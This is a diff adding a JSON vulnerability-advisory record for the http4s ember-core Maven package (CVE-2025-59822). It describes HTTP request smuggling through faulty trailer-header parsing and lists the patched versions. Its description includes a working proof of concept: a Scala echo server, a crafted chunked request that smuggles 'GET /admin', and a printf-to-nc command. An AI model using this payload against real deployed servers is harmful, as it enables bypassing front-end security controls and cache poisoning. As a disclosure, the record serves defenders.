@@ -1,0 +1,62 @@
+{
+  "Severity": "MODERATE",
+  "UpdatedAt": "2025-09-23T17:37:24Z",
+  "Package": {
+    "Ecosystem": "MAVEN",
+    "Name": "org.http4s:http4s-ember-core_2.13"
+  },
+  "Advisory": {
+    "DatabaseId": 313635,
+    "Id": "GSA_kwCzR0hTQS13Y3doLTdnZnctNXdycs4ABMkj",
+    "GhsaId": "GHSA-wcwh-7gfw-5wrr",
+    "References": [
+      {
+        "Url": "https://github.com/http4s/http4s/security/advisories/GHSA-wcwh-7gfw-5wrr"
+      },
+      {
+        "Url": "https://github.com/http4s/http4s/commit/dd518f7c967e5165813b8d4a48a82b8fab852d41"
+      },
+      {
+        "Url": "https://nvd.nist.gov/vuln/detail/CVE-2025-59822"
+      },
+      {
+        "Url": "https://github.com/advisories/GHSA-wcwh-7gfw-5wrr"
+      }
+    ],
+    "Identifiers": [
+      {
+        "Type": "GHSA",
+        "Value": "GHSA-wcwh-7gfw-5wrr"
+      },
+      {
+        "Type": "CVE",
+        "Value": "CVE-2025-59822"
+      }
+    ],
+    "Description": "### Summary\nhttp4s is vulnerable to HTTP Request Smuggling due to improper handling of HTTP trailer section.\nThis vulnerability could enable attackers to:\n- Bypass front-end servers security controls\n- Launch targeted attacks against active users\n- Poison web caches\n\nPre-requisites for the exploitation: the web appication has to be deployed behind a reverse-proxy that forwards trailer headers.\n\n### Details\nThe HTTP chunked message parser, after parsing the last body chunk, calls `parseTrailers` (`ember-core/shared/src/main/scala/org/http4s/ember/core/ChunkedEncoding.scala#L122-142`).\nThis method parses the trailer section using `Parser.parse`, where the issue originates.\n\n`parse` has a bug that allows to terminate the parsing before finding the double CRLF condition: when it finds an header line that **does not include the colon character**, it continues parsing with `state=false` looking for the header name till reaching the condition `else if (current == lf \u0026\u0026 (idx \u003e 0 \u0026\u0026 message(idx - 1) == cr))` that sets `complete=true` even if no `\\r\\n\\r\\n` is  found.\n```scala\nif (current == colon) {\n  state = true // set state to check for header value\n  name = new String(message, start, idx - start) // extract name string\n  start = idx + 1 // advance past colon for next start\n\n  // TODO: This if clause may not be necessary since the header value parser trims\n  if (message.size \u003e idx + 1 \u0026\u0026 message(idx + 1) == space) {\n    start += 1 // if colon is followed by space advance again\n    idx += 1 // double advance index here to skip the space\n  }\n  // double CRLF condition - Termination of headers\n} else if (current == lf \u0026\u0026 (idx \u003e 0 \u0026\u0026 message(idx - 1) == cr)) { // \u003c----- not a double CRLF check\n  complete = true // completed terminate loop\n}\n```\nThe remainder left in the buffer is then parsed as another request leading to HTTP Request Smuggling.\n\n### PoC\n\nStart a simple webserver that echoes the received requests:\n```scala\nimport cats.effect._\nimport cats.implicits._\nimport org.http4s._\nimport org.http4s.dsl.io._\nimport org.http4s.ember.server.EmberServerBuilder\nimport org.http4s.server.Router\nimport org.http4s.server.middleware.RequestLogger\nimport org.typelevel.log4cats.LoggerFactory\nimport org.typelevel.log4cats.slf4j.Slf4jFactory\nimport com.comcast.ip4s._\n\nobject ExploitServer extends IOApp {\n\n  implicit val loggerFactory: LoggerFactory[IO] = Slf4jFactory.create[IO]\n\n  val echoService: HttpRoutes[IO] = HttpRoutes.of[IO] {\n    case req @ _ =\u003e\n      for {\n        bodyStr \u003c- req.bodyText.compile.string\n        method = req.method.name\n        uri = req.uri.toString()\n        version = req.httpVersion.toString\n        headers = req.headers.headers.map { header =\u003e\n          s\"${header.name.toString.toLowerCase}: ${header.value}\"\n        }.mkString(\"\\n\")\n        \n        responseText = s\"\"\"$method $uri $version\n$headers\n\n$bodyStr\n\n\"\"\"\n        result \u003c- Ok(responseText)\n      } yield result\n  }\n\n  val httpApp = RequestLogger.httpApp(logHeaders = true, logBody = true)(\n    Router(\"/\" -\u003e echoService).orNotFound\n  )\n\n  override def run(args: List[String]): IO[ExitCode] = {\n    EmberServerBuilder\n      .default[IO]\n      .withHost(ipv4\"0.0.0.0\")\n      .withPort(port\"8080\")\n      .withHttpApp(httpApp)\n      .build\n      .use { server =\u003e\n        IO.println(s\"Server started at http://0.0.0.0:8080\") \u003e\u003e IO.never\n      }\n      .as(ExitCode.Success)\n  }\n}\n```\n\n`build.sbt`\n```\nThisBuild / scalaVersion := \"2.13.15\"\n\nval http4sVersion = \"0.23.30\"\n\nlazy val root = (project in file(\".\"))\n  .settings(\n    name := \"http4s-echo-server\",\n    libraryDependencies ++= Seq(\n      \"org.http4s\" %% \"http4s-ember-server\" % http4sVersion,\n      \"org.http4s\" %% \"http4s-dsl\" % http4sVersion,\n      \"org.http4s\" %% \"http4s-circe\" % http4sVersion,\n      \"ch.qos.logback\" % \"logback-classic\" % \"1.4.11\",\n      \"org.typelevel\" %% \"log4cats-slf4j\" % \"2.6.0\",\n    )\n  )\n```\n\nSend the following request:\n```http\nPOST / HTTP/1.1\nHost: localhost\nTransfer-Encoding: chunked\n\n2\naa\n0\nTest: smuggling\na\nGET /admin HTTP/1.1\nHost: localhost\n\n```\n\nYou can do that with the following command:\n`printf 'POST / HTTP/1.1\\r\\nHost: localhost\\r\\nTransfer-Encoding: chunked\\r\\n\\r\\n2\\r\\naa\\r\\n0\\r\\nTest: smuggling\\r\\na\\r\\nGET /admin HTTP/1.1\\r\\nHost: localhost\\r\\n\\r\\n' | nc localhost 8080`\n\nYou will see that the request is interpreted as two separate requests\n```\n16:18:02.015 [io-compute-19] INFO org.http4s.server.middleware.RequestLogger -- HTTP/1.1 POST / Headers(Host: localhost, Transfer-Encoding: chunked) body=\"aa\"\n16:18:02.027 [io-compute-19] INFO org.http4s.server.middleware.RequestLogger -- HTTP/1.1 GET /admin Headers(Host: localhost)\n```",
+    "Origin": "UNSPECIFIED",
+    "PublishedAt": "2025-09-23T17:37:23Z",
+    "Severity": "MODERATE",
+    "Summary": "Http4s vulnerable to HTTP Request Smuggling due to improper handling of HTTP trailer section",
+    "UpdatedAt": "2025-10-13T15:20:22Z",
+    "WithdrawnAt": "",
+    "CVSS": {
+      "Score": 0,
+      "VectorString": ""
+    }
+  },
+  "Versions": [
+    {
+      "FirstPatchedVersion": {
+        "Identifier": "1.0.0-M45"
+      },
+      "VulnerableVersionRange": "\u003e= 1.0.0-M1, \u003c 1.0.0-M45"
+    },
+    {
+      "FirstPatchedVersion": {
+        "Identifier": "0.23.31"
+      },
+      "VulnerableVersionRange": "\u003c 0.23.31"
+    }
+  ]
+}
